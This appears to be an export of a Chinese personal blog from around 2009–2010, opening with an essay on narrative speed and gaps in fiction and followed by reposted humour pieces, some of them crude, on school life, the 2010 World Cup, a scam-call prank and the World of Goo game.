故事在未进入小说之前，实际上已经处在减速与加速并存的过程中。绝对时间是均匀的，但运动却不是均匀的。我们日常中所说的“事情发展缓慢”或“事情发展得太快了”，都在说明一个道理：运动的节奏是处在变化之中的。如果运动不是处在这样一种状态之中，史德恩的“将小说叙述时间与故事时间同步”的实践，必定是令人气闷的。他企图“将小说情节和处在世界的时序串联起来”，“把文学世界与真实世界时间的对照发挥到极效——将两者一对一地对照吻合”。他的理想是，“读者阅读一小时的份量，正好相当于主角一小时的活动时间，如此一来，他的小说便能和读者的经验完全对等” (见艾恩·瓦特《小说的兴起》)。他敢如此假设，盖因事情的发生、发展并非同一种速度。但即便是为此尝试，也显然是一种极端、一种对时间的既深刻却又不免机械的理解。通常来说，即使故事(运动)已经有了减速或加速，在被写入小说之后，还要作进一步的减速或加速的处理。 减速与加速的意念，实际上早已有之。但过去没有将它放入“时间”这一命题下来理解。它们以前的称呼叫“概述”与“描写”，或者叫“简叙”与“繁叙”。《三国演义》中的“曹操煮酒论英雄”，就是概述，而《水浒》中的“林教头风雪山神庙”则是描写。概述是对实际时间的压缩，而描写则往往企图与实际同步甚至是进行稀释——将描写之后的阅读所需要的时间变得比故事所发生的时间还长。前者则为加速，后者则为减速。上面已经说过，减速与加速不可能是由始至终的单项使用，而是交替使用的。但这不妨碍某一个小说家在总趋势上偏重于减速或是偏重于加速。博尔赫斯说：“当代小说要花五六百页才能让我们了解一个人物，而且前提是我们预先了解他。但丁只须一个片断。在这个片断中，人物便永远地框定了。但丁是在无意中找到这个时间片断的。我曾经在自己的作品中效仿他。而我居然因此而获得了好评。但是但丁早在中世纪就已找到了这秘诀：拿一个时间片断作某人一生的缩写和密码。在但丁的作品中，人物的一生被浓缩在一两个三行诗里，并因此而获得了永生。”（博尔赫斯《神曲》）博尔赫斯的基本叙事策略是加速。这种策略派生了他对短篇与长篇的独特见解。他一生中从未写过长篇。因为在他看来，长篇的长度简直是不可思议的：对这个世界的呈现，果真需要用长篇这样大的时间量来呈现吗?无独有偶，汪曾祺先生对长篇也有调侃。他在北京大学的文学讲座上，抽着烟，面孔微微上扬，眯着双眼，在烟雾中沉醉片刻，问：长篇为何物?这两位小说家对短篇小说的偏爱，既可从角度与选材等方面对他们的这种叙事行为加以解释——他们更善于也更喜爱选择适合于短篇小说的角度与材料，也可从时间概念上加以解释。实际上，博尔赫斯的态度很清楚：他喜欢对时间进行压缩——加速处理。他甚至把这种处理看成是小说家的看家本领。而托尔斯泰、肖洛霍夫等人则偏重于减速。这么说，倒不是因为他们写了长篇巨著，而是从他们的具体的写作上得到的判断。他们在一般情况下，更偏爱一种平缓的速度，偏爱详尽的描写，偏爱逻辑性很强的并且是环节较齐全的人物性格演变史——他们尽可能地让读者看到安娜·卡列尼娜或者是葛利高里是如何一步一步地走向他们的终结的。但无论是博尔赫斯还是托尔斯泰、肖洛霍夫，我们说前者惯用加速，而后两者惯用减速，都只能是一种相对的说法。因为，博尔赫斯尽管崇拜但丁的加速，但在他的小说中却仍然得——甚至可以说是必须得使用减速的手法，而托尔斯泰与肖洛霍夫也无法舍弃加速手法——如果舍弃，也就没有我们现在所见到的《安娜·卡列尼娜》、《战争与和平》与《静静的顿河》。不是对速度的娴熟控制，那一定是一些不堪卒读的文本。 “空白”实际上也应被纳入时间范畴。它是加速的一种极端行为，并且又是小说创作中的一个不可或缺的基本行动。它采用“粗暴”的却是必要的直接切割时段的方式，造成跳空，把速度陡然加快。孔乙己最后一次出现于咸亨酒店是“中秋过后”的“一天的下半天”。“自此以后，又长久没有看见孔乙己。到了年关，掌柜取下粉板说，‘孔乙己还欠十九个钱呢!’到第二年的端午，又说‘孔乙己还欠十九个钱呢!’到中秋可是没有说，再到年关也没有看见他。我到现在终于没有见——大约孔乙己的确死了。”(《孔乙己》)这是一段不算很短的时间，但这段时间是一个空白。“几年以后”，这是小说的惯用句式。它代表着一段空白。中国古典小说中经常说一句“一夜无话”，也是留一段空白。普鲁斯特在研究了福楼拜后，写道：“在我看来，《情感教育》中最美的地方，不在句子，而在空白。福楼拜刚刚用长长的篇幅来叙写、叙述弗雷德利克·莫罗最细微的动作，这时弗雷德利克看见一位警察举起剑朝一位起义者冲过去，后者倒了下去，‘于是弗雷德利克，目瞪口呆，认出了塞内卡尔!’这里是一个‘空白’，巨大的‘空白’。于是，突然时间的尺度不再是一刻钟，而直截了当地是一年，十年(我引用最后这几个字以表明这种巨大的、猝然的速度变化)。‘于是，弗雷德利克，目瞪口呆，认出了塞内卡尔’。‘他旅行，他熟悉轮船的忧郁……他回来……那是1867年末，如此等等。”（见让-伊夫·塔迪埃《普鲁斯特和小说》）。 空白带来的是节省，使总体时间长度得到了缩短，使小说在篇幅上控制在一定的、理想的规模成为可能。同时，带来了节奏上的不匀称，使阅读出现了激活阅读兴趣的弹性。另外，它还有其它种种的好处，比如，有些事情一旦老实写来，或者非常麻烦，或者很难表述，或者表述出来也只是堆积事实、索然无味，索性一跃而过，倒也干净利落。省略不计，反成上策。汤姆与玛丽亚的爱情过程，写起来又冗常又无趣又不自然，干脆，这一章写他们在火车站旁的一个小咖啡馆相识，下一章就写他们已度蜜月、在驶往土耳其的伊斯坦布尔的白色游轮上。如此处理，既省了许多麻烦，又使人产生了无穷猜想。 上面已说，无论是减速还是加速，全看是否合理。它们服从于规模、美学趣味等方面的需要。由速度带来的节奏，其功能之神奇是出乎人的意料的。“节奏的抑扬顿挫麻痹了读者的心灵，使他忘记一切，使他如在梦里一样跟着诗人一样想和一样看；但是如果没有节奏的抑扬顿挫，则这些形象再也不会那样强热地呈现在读者的心目中。”它“对我们竟有那样大的力量，以致我们略微模仿一下呻吟的声音就会使得自己满怀伤感”（柏格森《时间与自由意志》）。连续不断的同等间距的钟摆声，则会产生催眠作用。本人曾在《思维论》一书中，描绘过檐口雨滴的奇妙作用：如果只两三滴就结束水滴的情景，这几乎就不能引起我们的注意。如果让它继续滴下去，五滴、六滴、七滴、八滴……这时我们就会觉得下面可能要发生什么事情。倘若与剧情联系起来，它可以产生宁静感。如果是在表现一个孤独的灵魂，它会有助于增添寂寞感；如果写一场暗杀，则会加强紧张和恐怖感。悲剧感的产生需要一定时间长度的动作与酝酿，并且在节奏上总趋势呈现为平缓，而喜剧感的产生，往往只需一瞬。……小说家对速度以及由此产生的节奏之功能的心领神会，使他们顺利地实现了他们的美学希望。沈从文以总趋势为平缓的节奏写下了《边城》。他完成了对一个具有秀美感的少女形象的刻画，并获得了一种宁静的叙述风气。而一些具有现代意识的小说家们则采用了内(指故事)与外(表达故事的叙述)的双重跳跃与紧锣密鼓的语言，呈现了所谓的现代节奏，并以此表征现代化生活。 对速度的独到理解与独到处理，更是一个衡量小说家在掌握时间方面的水平的尺度。汪曾祺先生和林斤澜先生在谈到小说写作时，曾对简叙与繁叙手法的非常之处，作过这样的分析，叫作：有话则短，无话则长。如此妙语，既体现了汪先生和林先生对速度之认识的透彻，又体现了他二人对速度的独到理解。这种经验之谈，只能出自于那些对小说有精到体会的人之口。 速度问题是一个复杂的问题。速度感的产生既依赖于故事的速度，又依赖于叙述的速度。而这两者既有联系，又有独立性。有时故事减速了或者是加速了，叙述却可以采用与其相反的速度，而这时，故事无论是减速或是加速，我们都有可能感受不到。上面所引用的《孔乙己》的例子，就是一个证明。故事采用了空白(加速)，而那一段文字在我们的感觉上，却是很沉稳的。这里，我们可以看出这样一点来：用以叙述的语言，在速度感方面具有举足轻重的作用。“尹雪艳，总也不老。”这个句子就是一种有意的速度，就形成了一种节奏，而这一节奏的功能却是不可小觑的。它使我们感受到那人冷艳逼人的女性形象的不可忽视，这个女性形象对自然的对抗以及她对我们所构成的威胁。这个句子说明，语言可以独立于故事内容而凭借它单方面的力量制造速度以及节奏。我们用一个形象的比方再来确定一下对速度的掌握应取何种方式：小说家骑在马背上，既不能一味遛马，也不能一味跑马，而要以观看风景的心态一路前进，但却是跑跑停停，停停跑跑——节奏才能使他感到内心充满喜悦。","link":"/2009/132_2009-03-0613_56/"},{"title":"奇迹！我的硬盘居然成了2487.26G的！","text":"不知咋地，我的160G硬盘在计算机管理中奇迹地变成了2487.26G的！","link":"/2009/138_2009-01-1511_41/"},{"title":"三班列骚","text":"李季曹彭张，徐逗和远骚。­ 奶货和仙人，各霸占一方。­ 还有一SB，其名叫老高。­ 不仅脂肪肝，还携带三高。­ 要问谁最骚，莫过于笑骚。­ 这个老骚货，就会用*笑。­ 笑骚卧室里，全都是海报。­ 六万三千丈，每夜刺千强。­ 大帅张伯伦，自愧没他强。­ 一九九九年，直接气死亡。­ 话说一骚货，真是非常骚。­ 梦中也ZA，大战百千强。­ 老杨问是谁？杂面馒头响当当！­","link":"/2010/048_2010-10-3112_29/"},{"title":"麦兜定律","text":"麦兜定律1：你不尊重我，我尊重你，你还不尊重我，我依旧尊重你。你再不尊重我，我就废了你。 麦兜定律2：想哭就哭，想笑就笑，不要因为世界虚伪，你也变的虚伪了。 麦兜定律3：不开心睡一觉，就让它过去吧。伤心还好，伤胃就不好了。 麦兜定律4，要懂得珍惜守护，身边的每个人，因为前世扭断脖子的回眸，我们才换来了今生的相遇！ 麦兜定律5，我们可以慢慢向前走，但绝对不能后退。 麦兜定律6，永远不要后退，退到最后是无路可退。 麦兜定律7，有事情是要说出来的，不要等着对方去领悟，因为对方不是你，不知道你想要什么，等到最后只能是伤心和失望，尤其是感情。 名言一：感谢黑夜的来临，我知道今天不论有多失败，全新的明天仍然等待我来证明自己．．． 名言二：感谢我的身材，即使臃肿，我也能到世界各地去旅游。 名言三：感谢那些曾让我伤心难过的日子，我知道快乐已经离我不远了。 名言四：感谢我的鼻子，即使塌，也让我可以呼吸新鲜空气。 名言五：感谢太阳又升起，继续点燃我的梦想。 名言六：感谢不离不弃的你，让我知道仍有人爱我。 名言七：感谢我的双眼，再小，再眯，我也能看见，日出，日落，花开，花谢。 名言八：感谢老天爷所降下的雨水，为伤心淤积的心灵给刷洗洁净。 名言九：感谢你的支持，不论今天有多挫折，我仍会勇敢地活下去。","link":"/2010/052_2010-10-1622_05/"},{"title":"催泪弹（谨此文写给已经走过初中的人）","text":"记得，我们第一次自己去报到么？ 走进一群陌生人中。就是这些陌生人，组成了一个新的集体 也预示着我们曾经的初中生活开始了。。。。。 第一个同位？第一次军训？第一次考试？ 那些被泪水，汗水冲刷过的记忆 那些有过成就有过悲伤的记忆 第一个朋友？第一次开怀大笑？第一次在知己前吐露心中的不快？ 那些被欢笑，被幸福充斥的记忆 记得第一次和朋友出去吃饭么？第一次去KTV？第一个喜欢的人？ 记得初中的班主任么？记得那些当初看似很讨厌，现在却真的很想念的脸庞么？ 那个走过无数次的过道 那个走过无数次的校门 那个充满欢笑的操场 那段充满欢笑的记忆。。。。。 不知不觉 从一个幼稚，充满幻想，充满天真的小孩子 长大了 有了自己的思想 自己的梦想 不知不觉 到了忙碌的初三 每天和老师 同学在一起学习 忘了一切曾经的不愉快 投入到了学习 尽管初一初二学的是什么也不知道 尽管上课经常玩手机 中考的临近 我们不禁害怕身边这些同学的离去 害怕这些记忆被时间抹去 。。。。。。。。。。。。。。。。 或许 我们长大了 成熟了 真的知道感情了 真的知道那份同学情谊的珍贵了 终于 我们分开了 含着泪水分开了 过去的记忆挥之不去 我们不会忘记那份同学之间的情谊。。。 The End","link":"/2010/054_2010-10-1619_53/"},{"title":"送给你的同桌吧","text":"同桌总是第一个发现你的喜怒哀，然后逼你招出真相～ 同桌可以一枝笔不带，然后向你侵略～ 同桌可以和你在上课时、和你顶风做案说悄悄话～ 同桌可以无聊到在一张桌子传纸条～ 同桌会在你拉她上厕所时训你一顿，在陪你去6. 在老师提问你时，同桌会在纸上写下答案，你看不懂、她比你更急 老班提你背书时、同桌会冒着杀头地危险爬在桌上小声提示你 同桌总是习惯性的向你伸手要手纸～ 和同桌共同抄过一个人的做业、她骂你抄的慢10. 同桌会在别人欺负你时大叫：敢欺负俺同位，我去欺负你同位～ 你和同桌的共同财产就是那几枝破到家的笔，还是孬的人家类～ 同桌睡觉时会叮嘱你：老师来了叫醒我～ 同桌会在你捣乱时、使劲锤你：“班主任在窗户外边”14. 同桌总是把脚搭在你凳子上拍她的裤腿脚、或是系鞋带～ 同桌会在你渴时留半瓶水给你～ 同桌会在老师发作业时、帮你把做业本拿下来～ 同桌会在你上课玩手机时帮你放风、时不时吓你一下18. 同桌出去时会伸手向你要镜子和梳子～ 同桌离开时你警告你：看好家，少一笔心我给你没完！” ……… 看完，会不会想起某些人…多少同桌陪我们走过…，打过、闹过、笑过…有一种关系叫同桌… 铭记一生…","link":"/2010/067_2010-07-2218_48/"},{"title":"论坛的好处","text":"？问:论坛的好处！！！√答:1、你去过聊天室吗？或者上过QQ ?当你感觉腰酸背痛腿抽筋的时候，不妨揣上本《写作大全》，去论坛溜达溜达，那里的精彩会顿时让你感觉——“自打上了论坛，我是腰不酸了、背不痛了、腿不抽筋了、走路也有劲了，别说，这论坛还真管用！”2、论坛最大的好处是不分年龄 ，不用顾虑去40还是来30，你完全可以不用带《厚黑学》，因为论坛会让你无师自通，要知道—-“**们这一行的，哪能不日晒雨淋？多亏上了论坛，嘿，还真对得起咱这张脸.3、 你会为下一个帖子的写法而绞尽脑汁，当豁然开朗时，你会惊呼—-“论坛好，胃口就好，身体倍棒，吃嘛嘛香，您瞅准喽，论坛！4、 礼，乞福也。看帖回帖属于礼尚往来—“今年过节不收礼，收礼只收论坛帖！”5、论坛对于你，就好比骆驼对沙漠，偶尔心中会充满幻想。扬首远望—“每当看见天边的绿洲，我就想起了论坛！”6、你有过为了论坛的回帖而废寝忘食的时候吗？有过在废寝忘食之际回帖之后的那种对下个帖子的无限向往吗？这时，你的感觉除了充实，只有—-“上论坛，第二天舒服一点7、你可以随时查看你的文集，天呀，你会发现，一个字的回帖也会被算在文章数目里，你心里仅仅是自信吗？而确实是—“上论坛，就是这么自信！”8、 还有什么比留下你的只言片语更有说服力的东西呢？ —“钻石恒久远，论坛永留传！”9、 论坛对你不仅仅是小船对大海的向往，也不仅仅是水手对航行的渴望，因为你确实爱上了它—-“论坛，不只是吸引！“10、 你完全可以把你的生活都搬上论坛，关键是看您 的本事了—–“原来生活可以更论坛的！”呵呵，论坛如此好，怎么，你今天还没上呐？？","link":"/2010/058_2010-09-1813_56/"},{"title":"World of Goo 续","text":"发这个不是很火，但是我还是坚持吧….From very high up and with some totally huge new eyes,the Goo Balls could see very far. In every direction,they could see unexplored new islands,each crawling with undiscovered new SPECIES OF GOO. The gameplay possibilities would certainly be endless! END OF CHAPTER 1 SUMMER …the giant lady thing was a living electric generator. And that BEAUTY was a highly reactive liquid chemical. Like gasoline. Or turpentine. For years,her beauty juice powered the entire world! But as the world grew older,so did she. And when her Beauty dried up,so did her electrical output. Until tonight…! With fabulous new cosmetic surgery options, and raw BEAUTY PRODUCT injected DIRECTLY INTO HER FOREHEAD, the signs of age melted away! …even though she couldn’t move her face because of all the chemicals,the BEAUTY GENERATOR WAS BACK! A truly sustainable energy solution! All around the world,lights glowed brighter! Power meters spun faster! Electrical lines surged with youthful energy! …a factory opens in the south… END OF CHAPTER 2 FALL CONGRATULATIONS! World of Goo is now 3D WARNING!!! you appear to be inconpatible with: THE WORLD THE INFORMATION SUPERHIGHWAY END OF CHAPTER 3 WINTER Welcome to the Information Superhighway! A land of beauty! A land of science! philosophy! architecture! fan fiction! Everything you see,from the water to the leaves are made from sweet free flowing information. See if you can catch some information on your tongue! Of course… …the whole place was abandoned years ago. This must be all that’s left. A Error 403: Temporarily Denied A representative of World of GooCorporation must first accept the Termsand Conditions. The email should already be in their inbox. Love MOM Over§§§ The last of the Goo Balls were… … …uh oh… …there aren’t any more Goo Balls. They must have all been sucked away by the pipe system… All the Goo Balls from the entire world! …all sucked up and sent to the former World of Goo Corporation campus… …where they have been building a giant tower into the sky! Probably a good thing too. The telescope is useless anyway. It’s unable to see past that layer of smog and dust. Well,without any more Goo Balls,I guess that’s it. We’ll never know what the telescope can see… Or what’s really up there. The end. Thanks for playing. Time to go do other things now. Maybe write a travel companion. I’m going into the Telescope now. Goodbye. Whatever you do… don’t play with the fish. -your friend,the Telescope Operator. formerly, the Sign Painter End…… As the Telescope driftedhigher and higherit could see very far! The Goo Balls had come fromevery direction! from every species! from every island! through a filthy pneumaticpipe system to build a giant towerin the sky! a giant tower of Goo! But what were they building towards? What future adventureswere up there? The telescope looked forthousands of miles in every direction! ……World of Goo……2DBOY","link":"/2010/069_2010-07-1819_36/"},{"title":"爆笑!!!接到骗子电话怎么办？往死里整！","text":"“王总啊，啊！” “你是谁呀？” “你的老朋友啊” “谁呀？” “广东的老朋友啊，连我的声音你都听不出来了？” “你是？”“哎呀，王总你贵人多忘事啊” 我是真的被问蒙了，想不起来这个声音，又寒暄了半天，对方就是不说自己的名字，最后我不耐烦了，“你不说就算了” 我就把电话挂了。 后来想想有点不对劲，可能是骗子，如果我把对方的声音认做某个老朋友，对方就会想办法讲故事骗钱了。 我按照刚才显示的号码我把电话拨回去了。 我说：“你是广东的老张吧” “对呀对呀对呀，看看，我说你贵人多忘事，连我的声音都听不出来了。”“对不起啊，老张，我还以为谁和我开玩笑呐” “王总啊，我要过沈阳去，请你吃饭，我做东……” 我问：“老张，你母亲的癌症怎么样了” 对方怔了一下：“哦……还是老样子”“哎，得了这病也没办法。你爸车祸的案子结了吗？” “哦……差不多了” “行啊，人都去了，赔不赔的也别太在意了” “恩” 我又问：“强J你老婆的流氓逮到了没啊？”“逮到了，逮到了” 我又问“你儿子没屁眼的手术做了没啊？” 对方憋了10秒种，没说出话来，把电话挂了","link":"/2010/070_2010-07-1812_05/"},{"title":"超级有才打油诗一首","text":"怒 何故 昨日暮 偶见那妇 把纤纤玉手 交那衰人牵住 盈盈笑语左右顾 神采飞扬凌波微步 美眸中一片深情倾注 似前年与我同在湖畔路 也这般附耳交颐低语轻诉 如今见我头也不点形同陌路 我发现自己旧情难忘六神无主 两眼痴呆两腿生根心内如被汤煮 像我这么优秀的男子她却总嫌我土 那土鳖相貌恶心行止委琐她爱他粗鲁 女孩子搞不清她想什么我越琢磨越添堵 明知道她与自己不合适想忘记她另起灶炉 到头来都只能是剪不断理还乱最终于事无补 兄弟我长这么大从来没怕过谁却栽给了这个主 看来是上辈子欠她很多钱早知如此就不该和她赌 碰上她算我倒霉下次说什么也得找个温柔姑娘相处 总算明白这世上漂亮不能当饭吃往往还让你难堪重负 从现在起踏踏实实勤勤恳恳谦虚谨慎待人有礼爱护公物 切记过马路左右看要走人行横道线要想富少生孩子多种树 化悲痛为力量一边努力学习一边时刻准备着开发祖国大西部 大丈夫何患无妻没有了你虽然孤独但也使我从此不再一叶障目 这也使我好好反思为什么会失败总结经验教训继续探索革命道路 我会遇上好姑娘没命地追她想她爱她决不放过她不管她属虎还属兔 这个有志青年是个好同志失恋了不失魂落魄自暴自弃颇有男儿气度 他虽然遭遇了现代女陈世美被无情抛弃但没有怪命也不埋怨老父 反而擦亮眼睛激发斗志将其丑恶行径卑鄙嘴脸进行了深刻揭露 再次论证了革命斗争将会在一定范围内长期存在的精辟论述 展望了初级阶段革命尚未成功同志仍须努力这条基本道路 尤其难为可贵的是该同志认真反省自己并触动灵魂深处 认识到过去在湖畔漫步是小资产阶级情调的严重错误 险些为漂亮的外表所迷惑中了糖衣炮弹的惯用招数 理论联系实际痛定思痛如梦方醒才知道差点迷途 眉清目秀加白净面皮不是本质不是人生的全部 语言虽然通俗但体现了有志青年的朴实感悟 批评与自我批评言辞感人真可谓发自肺腑 并萌发修身齐家治国平天下的远大抱负 体现了由此及彼由表及里的思想反复 像他这么优秀的青年怎么能说他土 自然是徒具外表的女人有眼无珠 天涯何处无芳草佳丽不问出处 好马不吃回头草旧情勿枉顾 兔子不吃窝边草以为三窟 百步之内必有芳草无数 也许有天她变成弃妇 才会想起你的好处 再回来找你倾诉 一切已经太晚 你也有今天 不屑一顾 不理她 扮帅 酷","link":"/2010/071_2010-07-1620_13/"},{"title":"章鱼哥不幸因公逝世","text":"据最新小道消息称，在南非世界杯期间大出风头的章鱼哥保罗已经不幸去世。 因在世界杯期间连续八次神奇预测，它的能力获得了世界人民的认同，这其中也包含中国球迷。应中国球迷请求，章鱼哥保罗对“中国队何时挺进16强”命题进行长达三个小时的长考，之后一头撞死在玻璃上。 章鱼哥为中国足球已经尽力了！","link":"/2010/072_2010-07-1521_27/"},{"title":"World of Goo","text":"From very high up and with some totally huge new eyes,the Goo Balls could see very far. In every direction,they could see unexplored new islands,each crawling with undiscovered new SPECIES OF GOO. The gameplay possibilities would certainly be endless! END OF CHAPTER 1 SUMMER …the giant lady thing was a living electric generator. And that BEAUTY was a highly reactive liquid chemical. Like gasoline. Or turpentine. For years,her beauty juice powered the entire world! But as the world grew older,so did she. And when her Beauty dried up,so did her electrical output. Until tonight…! With fabulous new cosmetic surgery options, and raw BEAUTY PRODUCT injected DIRECTLY INTO HER FOREHEAD, the signs of age melted away! …even though she couldn’t move her face because of all the chemicals,the BEAUTY GENERATOR WAS BACK! A truly sustainable energy solution! All around the world,lights glowed brighter! Power meters spun faster! Electrical lines surged with youthful energy! …a factory opens in the south… END OF CHAPTER 2 FALL CONGRATULATIONS! World of Goo is now 3D WARNING!!! you appear to be inconpatible with: THE WORLD THE INFORMATION SUPERHIGHWAY END OF CHAPTER 3 WINTER Error 403: Temporarily Denied A representative of World of GooCorporation must first accept the Termsand Conditions. The email should already be in their inbox. Love MOM 未完、待续","link":"/2010/073_2010-07-1513_24/"},{"title":"世界杯什么的，最讨厌了","text":"XX什么的，最讨厌了！ 大扫盲： ●一般在动漫里出现的比较多，属于傲娇女主常用的句式。只是表示讨厌的意思，但有的时候也表示喜欢… 在傲娇大行其道的今天，此句作为娇蛮属性的代表迅速从“少数人的萌”成为了“网友的流行语”。这个XX，通常为说话人喜欢或向往，但是不愿意承认的东西…虽然很喜欢但是非常的纠结！比如光棍们常说：“情人节什么的！最讨厌了！”“情侣什么的，最讨厌了！”但是没关系！圣诞节大家都可以过啊！重要的是气氛啊！ ●世界杯什么的，最讨厌了… 真的很讨厌，为什么一直在爆冷啊…是因为南非风水不好，还是因为那边冬天真的很冷…知道我读11年书，才好不容易休息三个月么…干嘛早早的让帅哥们回了家… ●刘建宏什么的，最讨厌了… 高喊进了进了进了….我真的全身经脉俱毁… ， ●贝利什么的，最讨厌了… 你是神，你是最接近上帝的男人。难道你上辈子就是那传说中折翼的天使…… ●荷兰队什么的，最讨厌了… 赛前，我觉得巴西队会把荷兰队打成河南队，结果，荷兰队把巴西队打成了八一队。 ●解说员什么的，最讨厌了… 网友选出来的解说员水平排序：贺炜、段暄、呜呜祖拉、刘建宏。 ●亨利什么的，最讨厌了… 你冒着身败名裂的风险把法国送进世界杯是图了啥？？？ 亨利：我手贱… ●裁判什么的，最讨厌了… 德迷说:我们赢你们4：1 英迷说:兰帕德的球进了，裁判误判 德迷说:我们的反击成功率很高 英迷说:兰帕德的球进了，裁判误判 德迷说:你们的防守漏洞百出 英迷说:兰帕德的球进了，裁判误判 德迷说:鲁尼在梦游 英迷说:兰帕德的球进了，裁判误判 ●意大利什么的，最讨厌了… 意大利有三宝：人帅，悲情，赢不了。据说每个意大利的国脚上辈子都是折翼的天使，这种人，你伤不起！ ●呜呜祖啦什么的，最讨厌了… 嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡嗡 ●梅西什么的，最讨厌了… 梅西赛后采访：当地球迷很热情，不过吹喇叭的助威方式我还是不太适应。相对来说我更加怀念中国球迷，他们的加油口号我至今记忆犹新：谢亚龙，下课！ ●夫妻球迷什么的，最讨厌了… 一对夫妻在家看世界杯，妻羞答答的对夫说：“老公，晚上你也射门吧”老公愤怒的把妻子推开：“你懂个屁，射自己家的门算输，射别人家的门算赢！”","link":"/2010/074_2010-07-1513_22/"},{"title":"2010 高考0分作文  看看吧  这哥们太有才啦","text":"汽车渴望公路，花草渴望雨露，太监迫切渴望着雄性激素。 灵魂渴望超度，心灵渴望归宿，而我则迫切渴望着有个媳妇。 众里寻她千百度，踏平脚下路，蓦然回首细环顾，大婶大娘无数。 都说男儿有泪不扑簌，但那绝对是未到伤心处。 有谁知道泪水已经多少次模糊了我心灵的窗户？ 况且咱都是沧海一粟，凭啥我就不能在爱情的海岸登陆？只能一口一口地吃着干醋？ 人生本来就短促，我又怎能就这样默默地虚度？ 为了尽快给自己找一个归宿，我决心不择手段的全力以赴。 错误，错误。这种想法最终成了我难逃的劫数。 没想到我一时的慌不择路，竟上演了那样惨绝人寰的一幕。 那是我走投无路，勾引了有夫之妇。谁知道罪行败露，被人家当场抓住。 只后悔不会武术，没能够杀出血路。无奈的任人摆布，惨遭了打击报复。 他们恼羞成怒，打得义无反顾。片刀循环往复，板砖频频招呼。 我浑身血流如注，两腿还不住抽搐。走错那罪恶一步，差点儿就死不瞑目。 恐怖，恐怖。真庆幸我还能把命保住。 那场我自导自演的前车之覆，带给了我贼深贼深的感触。 往事历历在目，我此刻一一追溯。 经历了苦痛挣扎后的觉悟，终于上升到了前所未有的高度。 问世间情为何物，我算是大彻大悟。 感情上的事儿看来还真不能过于盲目。 是你的挡不住，不是你的留也留不住。 别人的女友就是再好也不能轻易接触。 有道是皮之不存毛将焉附，我要是over了还上哪去找我的贤内助？ 更何况人生短促，还有很多东西值得我们珍惜和呵护。 爱情的光环固然炫目，也毕竟不是生命的全部。 写到这里，似乎字数不够。那就容我，再些编构。 说来说去，心声止不住流露。 七夕哥们儿都有节目，我这个单身人物，即将刺痛苦楚。 哎呀不好！考试就快结束，试卷还有问题无数，我有点儿坐立不住。 最后总结一句，作文便就此打住。 问世间情为何物，圣经曰：废物！","link":"/2010/076_2010-07-1021_34/"},{"title":"新东方老师讲笑话最全版","text":"由于字数限制5000字，有删减。 有人问我考四级没背单词怎么办.我只能回答四个字:重在参与.如果你觉得不背单词也能考,那我只能说这是你的幻觉. 同学们,走进四级考场不要紧张,你会发现新东方老师与你同在.因为每年的四六级,托福,GRE考试,新东方都会派一批壮丁去考试,是去偷卷子的.当你在考场上发现了老师,不要激动,要保持内心的平静,安详与矜持.老师会帮助你的.不要苕到考一半把老师卷子扯过来就抄啊.要有技巧.比如问监考老师:第八题看不清楚.这时就会听到熟悉的声音在你身后说:第八题的C选项看不清楚. 大家可以在网上下载一些背单词的游戏没事玩玩.有人说这很无聊.没有关系,就把它当超级玛丽玩就行了.什么?你不知道超级玛丽?那我只能说,这位同学你没有童年. 同学们大多都是汉口的吧.以后可以对老外说:I’M FROM HK.牛啊,老外以为你是香港的.不过武昌的同学我建议你们就不要这样说了. 老俞这辈子还有两个心愿没有完成,一是办新东方大学.二是把新东方厨师学校给收购了.要不然太丢人了,出去说我是新东方的,别人以为你是厨师. 大家下节课就能见到教阅读的老师,他是传说中的琐男.就是委琐的男人.因为他长期用一个牌子的香水:SIX GOD.你们不知道吗?这么有名的牌子都不知道?六神撒! 同学们,这道题蛮搞人,蛮搞人.不要紧.我们一起来把它搞一下.(老师你讲话好A啊~) 大家不要BS琐男嘛,人家也长的很偶像剧的嘛.你们不相信吗?我就觉得象啊.象流星花园里面的.杉菜的爸爸嘛! 大家知道老俞是一个疯狂的现金爱好者.很长的一段时间新东方发工资都是现金的.大家知道新东方老师拿工资是按课时算的.谁接课接的多,这话怎么这么诡异啊哈.谁的钱就多.发工资那天我拿一个女士的小手提包去了,觉得装工资足足有余.结果小云老师过来了我一看,他拿了个密码箱!天啊!我崩溃了,过了一会,MR.悲剧来了.我一看,他提了一个网兜!这下我彻底崩溃了.他们都接了多少课啊?! 大家看电影来练听力是很好的.一般我建议大家看一些老的对话比较多的片子.有多老呢,比&lt;罗马假日&gt;还老的片子就不用看了.上个班有个同学跟我说他看更老的片子.我问是什么.他说:&lt;卓别林&gt;!我的天啊!请问这个片子有没有声音啊?用无声电影练听力.这哥们真刁! 大家知道吗婴儿的视觉没有发育完全,看东西都是模糊的,不要以为小BB看到你笑是他喜欢你,你的头在他眼里就是一个模糊的鸡蛋,你看到一个鸡蛋晃来晃去你不笑吗.(然后开始讲题,过了一会,突然的停下)你们看着我笑干什么? 什么叫[爱情”?看看你们现在在座的各位.有许多都是成双成对的.也有许多同学.别看他们现在落了单.肯定有相当一部分不是来认真学习的.而是想来成就一段美丽地革命感情的. 外国人有说:[Why not?”表示同意.但是中国一定没有这样说的.假如说你爸想请你出去吃饭.对你说:[晚上出去吃饭怎么样?”你的眼睛直勾勾地盯着你爸.说:[为什么不?”你爸说:[我–靠–”然后肯定一脚把你踹出去. 在座的各位.有男的.有女的.有男生女生坐在一起的.你们是不认识.但我就非要把你们说成是两口子.你怎么招吧! 北京话中的[丫”是个很神奇的字.只能跟在人称代词后面使用.跟[我”行吗?有个人走过来问你说:[嘿你丫干吗呢!”[我丫没干吗呢!” 这是人话吗?所以不能接第一人称.–所以[丫”这个字很神奇.说它是脏话吧.也不全是,说它不是脏话吧.你肯定不敢跟你爸说这个.你爸下班回家.你一看见他就来一句:[呦!你丫回来啦?”– ? 这老师啊讲阅读题都是事先知道答案以后给你逆向思维的讲出来.所以老师最喜欢什么样的学生?一同学拿着题过来问:[老师.这道题答案为什么选C呀?”老师就讲:[哦–这样这样这样这样–”讲.讲完了.同学说哦.谢谢老师.就走了.老师最恨什么样的学生?一同学拿着题走过来问:[老师.这题选什么?”老师也没看过啊.就说:[你自己先选啊!”[废话!我知道选哪个还来找你干吗?!”还有一种学生是老师恨之入骨的那种.说一个同学拿着题过来问:[老师.这道题答案为什么选C呀?”老师就讲:[哦–这样这样这样这样–”讲.讲完了.同学突然说:[哎呀老师不好意思!这题答案上好象是D 